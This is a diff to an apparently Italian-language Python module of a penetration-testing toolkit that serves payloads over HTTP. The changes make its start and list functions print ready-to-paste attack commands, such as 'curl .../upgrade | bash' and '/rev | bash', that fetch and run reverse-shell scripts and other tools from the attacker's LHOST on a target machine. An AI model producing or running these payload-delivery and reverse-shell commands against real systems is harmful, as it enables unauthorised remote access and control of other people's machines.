@@ -219,14 +219,28 @@ def start(port: int = 8000, lhost: str | None = None, lport: int = 4444) -> str:
     _thread = threading.Thread(target=_server.serve_forever, daemon=True)
     _thread.start()
 
-    return (
-        f"Server attivo su \033[92mhttp://{_lhost}:{port}\033[0m  "
-        f"(LHOST={_lhost}  LPORT={_lport})\n"
-        f"  curl http://{_lhost}:{port}/upgrade | bash   — upgrade shell\n"
-        f"  curl http://{_lhost}:{port}/rev              — reverse shell bash\n"
-        f"  curl http://{_lhost}:{port}/sh               — reverse shell python\n"
-        f"  File statici dalla cartella: {STATIC_ROOT}"
-    )
+    base = f"http://{_lhost}:{port}"
+    out = [
+        f"Server attivo su \033[92m{base}\033[0m  "
+        f"(LHOST={_lhost}  LPORT={_lport})",
+        "",
+        f"  curl {base}/upgrade | bash",
+        f"  curl {base}/rev | bash",
+        f"  curl {base}/sh | bash",
+    ]
+    if STATIC_ROOT.is_dir():
+        static_files = sorted(f for f in STATIC_ROOT.iterdir() if f.is_file() and not f.name.startswith("."))
+        if static_files:
+            out.append("")
+            for f in static_files:
+                name = f.name
+                if name.endswith(".sh"):
+                    out.append(f"  curl {base}/{name} | bash")
+                elif name.endswith(".exe"):
+                    out.append(f"  curl {base}/{name} -o {name}")
+                else:
+                    out.append(f"  curl {base}/{name} -o {name} && chmod +x {name}")
+    return "\n".join(out)
 
 
 def stop() -> str:
@@ -359,14 +373,18 @@ def list_static() -> str:
     files = sorted(f for f in STATIC_ROOT.iterdir() if f.is_file() and not f.name.startswith("."))
     if not files:
         return "Nessun file in static/. Usa 'serve fetch' per scaricare i tool."
+    if _server is not None:
+        port = _server.server_address[1]
+        base = f"http://{_lhost}:{port}"
+    else:
+        base = "http://<LHOST>:8000"
     lines = [f"\nFile in static/ ({len(files)}):"]
     for f in files:
-        size = f.stat().st_size
-        if size > 1_048_576:
-            label = f"{size / 1_048_576:.1f} MB"
-        elif size > 1024:
-            label = f"{size / 1024:.1f} KB"
+        name = f.name
+        if name.endswith(".sh"):
+            lines.append(f"  curl {base}/{name} | bash")
+        elif name.endswith(".exe"):
+            lines.append(f"  curl {base}/{name} -o {name}")
         else:
-            label = f"{size} B"
-        lines.append(f"  {f.name:<30s} {label:>10s}")
+            lines.append(f"  curl {base}/{name} -o {name} && chmod +x {name}")
     return "\n".join(lines)
